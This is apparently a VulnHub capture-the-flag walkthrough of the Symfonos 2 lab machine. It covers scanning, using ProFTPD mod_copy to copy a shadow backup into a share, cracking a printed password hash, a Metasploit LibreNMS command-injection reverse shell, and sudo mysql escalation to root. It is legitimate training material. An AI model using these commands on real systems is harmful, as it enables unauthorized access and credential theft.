# Symfonos 2 | VulnHub
https://www.vulnhub.com/entry/symfonos-2,331/

### 1. Scan
```bash
Nmap scan report for 192.168.34.142
Host is up, received arp-response (0.00085s latency).
Scanned at 2021-07-04 00:19:12 EDT for 25s
Not shown: 65530 closed ports
Reason: 65530 resets
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 64 ProFTPD 1.3.5
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Cvyjh+QnQHsoZt3FqnW8JazNn1CYvc7uuArLkDPM25xV8l4Jc7Xw9InhmSFKJJD0mXhLALt/9byLeH7CyBEjpKATbSsEIL1iQ7G7ETmuOdZPfZxRnLhmaf1cvUxLapJQ5B3z67VR0PxvjfDk/0ARPAhKu1CuPmZk/y4t2iu8RKHG86j5jzR0KO3o2Aqsb2j+7XOd4IDCSFuoFiP3Eic/Jydtv73pyo+2JxBUvTSLaEtqe1op8sLP8wBFRX4Tvmqz/6zO1/zivBjBph8XMlzuMkMC8la8/XJmPb8U5C/8zfogG+YwycTw6ul7616PIj2ogPP89uyrTX9dM3RuZ9/1
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXypIGuum1SlMddq/BrUwIZM1sRIgbzdijCa1zYunAAT+uKTwPGaKO7e9RxYu97+ygLgpuRMthojpUlOgOVGOA=
|   256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILluhq57UWA4q/mo/h6CjqWMpMOYB9VjtvBrHc6JsEGk
80/tcp  open  http        syn-ack ttl 64 WebFS httpd 1.21
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:13:6C:26 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/4%OT=21%CT=1%CU=30285%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
OS:=60E136D9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%
OS:TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)
```
The machine is Debian, running FTP, a WebFS web server, SSH and SMB.  
The WebFS server is vulnerable to a buffer overflow - https://www.exploit-db.com/exploits/23196, however it requires the ability to create files on the file system. So this might be something to look at later.

### 2. Check on SMB
Just like last time, check out SMB.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ smbmap -R -H 192.168.34.142 -P 445 --depth 20
[+] Guest session       IP: 192.168.34.142:445  Name: 192.168.34.142                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        .\anonymous\*
        dr--r--r--                0 Thu Jul 18 10:30:09 2019    .
        dr--r--r--                0 Thu Jul 18 10:29:08 2019    ..
        dr--r--r--                0 Thu Jul 18 10:25:17 2019    backups
        .\anonymous\backups\*
        dr--r--r--                0 Thu Jul 18 10:25:17 2019    .
        dr--r--r--                0 Thu Jul 18 10:30:09 2019    ..
        fr--r--r--            11394 Thu Jul 18 10:25:16 2019    log.txt
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)
```
Retrieve the log.txt file.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ smbclient //192.168.34.142/anonymous         
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 10:30:09 2019
  ..                                  D        0  Thu Jul 18 10:29:08 2019
  backups                             D        0  Thu Jul 18 10:25:17 2019

                19728000 blocks of size 1024. 16313672 blocks available
smb: \> cd backups
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 10:25:17 2019
  ..                                  D        0  Thu Jul 18 10:30:09 2019
  log.txt                             N    11394  Thu Jul 18 10:25:16 2019

                19728000 blocks of size 1024. 16313672 blocks available
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt (1236.3 KiloBytes/sec) (average 1236.3 KiloBytes/sec)
smb: \backups\> exit
                                                                                                                                                                                   
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat log.txt   
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
...

[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes

root@symfonos2:~# cat /usr/local/etc/proftpd.conf
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

...
# Set the user and group under which the server will run.
User                            aeolus
Group                           aeolus

```
So at the top of this log there are some commands ran by root to back up the shadow file, then the smb.conf is shown. Later on the user also displays the FTP configuration. The only thing these logs provide is a username: aeolus, and not really much else. I guess also the knowledge that the shadow file was backed up. Next to check out FTP.

### 3. Look at FTP
Looking at FTP, Nmap says it is ProFTPd 1.3.5. This one does have a command execution excution vulnerability (https://www.exploit-db.com/exploits/36803) that can be done unauthenticated, which is good because anonymous access requires a valid email which we don't have.
  
The exploits basically let you copy a file from one place to another. It should be possible to target the shadow.bak file and drop it on the web server (which seems to be what a lot of the pre-written exploits aim to do with a reverse shell php file), however getting it to the web server is tricky without knowing where the files are hosted from. WebFS can host from anywhere and there doesn't seem to be a standard location. The other option is to copy into the accessible anonymous share, where the location is known because of having read the config file.

### 4. Exploit FTP
Copy shadow.bak into the SMB share.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ftp 192.168.34.142
Connected to 192.168.34.142.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.34.142]
Name (192.168.34.142:kali): 
331 Password required for kali
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
ftp> site cpto /home/aeolus/share/shadow.bak
250 Copy successful
ftp> exit
221 Goodbye.
```
That appears to have worked.  
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ smbclient //192.168.34.142/anonymous
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul  4 01:54:47 2021
  ..                                  D        0  Thu Jul 18 10:29:08 2019
  backups                             D        0  Thu Jul 18 10:25:17 2019
  shadow.bak                          N     1173  Sun Jul  4 01:54:47 2021

                19728000 blocks of size 1024. 16313488 blocks available
smb: \> get shadow.bak
getting file \shadow.bak of size 1173 as shadow.bak (381.8 KiloBytes/sec) (average 381.8 KiloBytes/sec)
smb: \> exit
                                                                                                                                             
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat shadow.bak 
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
daemon:*:18095:0:99999:7:::
bin:*:18095:0:99999:7:::
sys:*:18095:0:99999:7:::
sync:*:18095:0:99999:7:::
games:*:18095:0:99999:7:::
man:*:18095:0:99999:7:::
lp:*:18095:0:99999:7:::
mail:*:18095:0:99999:7:::
news:*:18095:0:99999:7:::
uucp:*:18095:0:99999:7:::
proxy:*:18095:0:99999:7:::
www-data:*:18095:0:99999:7:::
backup:*:18095:0:99999:7:::
list:*:18095:0:99999:7:::
irc:*:18095:0:99999:7:::
gnats:*:18095:0:99999:7:::
nobody:*:18095:0:99999:7:::
systemd-timesync:*:18095:0:99999:7:::
systemd-network:*:18095:0:99999:7:::
systemd-resolve:*:18095:0:99999:7:::
systemd-bus-proxy:*:18095:0:99999:7:::
_apt:*:18095:0:99999:7:::
Debian-exim:!:18095:0:99999:7:::
messagebus:*:18095:0:99999:7:::
sshd:*:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
mysql:!:18095:0:99999:7:::
Debian-snmp:!:18095:0:99999:7:::
librenms:!:18095::::::
```
Cool!!

### 5. Crack the hash
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ hashcat -a 0 -m 1800 shadow.hashes /usr/share/wordlists/rockyou.txt --quiet
$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo
^C
```
One hash cracks to give credentials `aeolus:sergioteamo`. Hashcat doesn't find the other one (to be more accurate, I give up and close it after 15 mins).

### 6. Log in over SSH
```bash                                                                                                        
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh aeolus@192.168.34.142    
The authenticity of host '192.168.34.142 (192.168.34.142)' can't be established.
ECDSA key fingerprint is SHA256:B1Gy++lPIkpytQPksfdhzAydQ8n3Hlor7srtoKol248.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.34.142' (ECDSA) to the list of known hosts.
aeolus@192.168.34.142's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 18 08:52:59 2019 from 192.168.201.1
aeolus@symfonos2:~$ id
uid=1000(aeolus) gid=1000(aeolus) groups=1000(aeolus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### 7. Enumerate from user
First thing to check is the user webfs is running as. If it is running as root, then the buffer overflow can be done to get root.
```bash
aeolus@symfonos2:~$ ps -aux | grep webfs
www-data    543  3.3  0.2  38944  1916 ?        Ss   Jul03   3:33 /usr/bin/webfsd -k /var/run/webfs/webfsd.pid -r /var/www/html -p 80 -f index.html -u www-data -g www-data
```
It's not running as root so that's out the window. There are some other processes running though under cronus.
```bash
aeolus@symfonos2:/var/www/html$ ps -aux | grep cronus
cronus      590  0.0  1.3 410584 10112 ?        S    Jul03   0:00 /usr/sbin/apache2 -k start
cronus      591  0.0  1.3 410584 10112 ?        S    Jul03   0:00 /usr/sbin/apache2 -k start
cronus      592  0.0  1.3 410584 10112 ?        S    Jul03   0:00 /usr/sbin/apache2 -k start
cronus      593  0.0  1.3 410584 10112 ?        S    Jul03   0:00 /usr/sbin/apache2 -k start
cronus      594  0.0  1.3 410584 10112 ?        S    Jul03   0:00 /usr/sbin/apache2 -k start
```
This indicates there's an Apache server running, but not externally facing because only WebFS was open to the outside. Checking Apache sites-enabled:
```bash
aeolus@symfonos2:/etc/apache2/sites-enabled$ ls
librenms.conf
aeolus@symfonos2:/etc/apache2/sites-enabled$ cat librenms.conf 
<VirtualHost 127.0.0.1:8080>
  DocumentRoot /opt/librenms/html/
  ServerName  localhost

  AllowEncodedSlashes NoDecode
  <Directory "/opt/librenms/html/">
    Require all granted
    AllowOverride All
    Options FollowSymLinks MultiViews
  </Directory>
</VirtualHost>
```
Apache is indeed listening internally.
```bash
aeolus@symfonos2:/etc/apache2/sites-enabled$ curl localhost:8080
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url=http://localhost:8080/login" />

        <title>Redirecting to http://localhost:8080/login</title>
    </head>
    <body>
        Redirecting to <a href="http://localhost:8080/login">http://localhost:8080/login</a>.
    </body>
</html>
```
Something's there.

### 8. Set up port forward
Can do this from the current SSH session.
```bash
aeolus@symfonos2:/etc/apache2/sites-enabled$ 
ssh> -L 127.0.0.1:8080:127.0.0.1:8080
Forwarding port.
```
This will forward all connections to port 8080 from my machine, through the SSH tunnel and direct them to port 8080 internally.

### 9. Enumerate new web server
The site is running an instance of LibreNMS. Did some dirbusting, but that's actually about it. Some versions of LibreNMS are vulnerable to authenticated RCE, and the aeolus credentials are able to provide access, which is good news.

### 10. Get a shell
```bash
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > options

Module options (exploit/linux/http/librenms_addhost_cmd_inject):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   sergioteamo      yes       Password for LibreNMS
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base LibreNMS path
   USERNAME   aeolus           yes       User name for LibreNMS
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.34.138   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux


msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run

[*] Started reverse TCP double handler on 192.168.34.138:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname vKtdAtfdi
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo YmfFtsGkJTr9mMMB;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "YmfFtsGkJTr9mMMB\r\n"
[+] Successfully deleted device with hostname vKtdAtfdi and id #1
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.34.138:4444 -> 192.168.34.142:32906) at 2021-07-04 02:25:56 -0400

python -c "import pty;pty.spawn('/bin/bash')"
cronus@symfonos2:/opt/librenms/html$ id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
```

### 11. Enumerate from user
Not much enumeration needed here either. First command ran shows the way.
```bash
cronus@symfonos2:/opt/librenms/html$ sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```
Because it can be ran as the superuser without a password, MySQL can be used to privesc.

### 12. Escalate to root
Spawn a shell within mysql to get to root.
```bash
cronus@symfonos2:/opt/librenms/html$ sudo mysql -e '\! /bin/sh'
# whoami
root
```